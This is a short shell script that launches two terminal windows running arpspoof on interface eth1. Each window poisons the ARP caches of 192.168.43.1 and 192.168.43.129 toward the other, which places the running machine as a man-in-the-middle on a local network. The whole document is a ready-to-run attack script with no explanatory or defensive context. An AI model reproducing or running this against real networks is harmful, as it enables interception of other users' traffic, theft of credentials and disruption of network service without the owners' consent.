#!/bin/sh
gnome-terminal -e 'sudo arpspoof -i eth1 -t 192.168.43.1 192.168.43.129' &
gnome-terminal -e 'sudo arpspoof -i eth1 -t 192.168.43.129 192.168.43.1' &
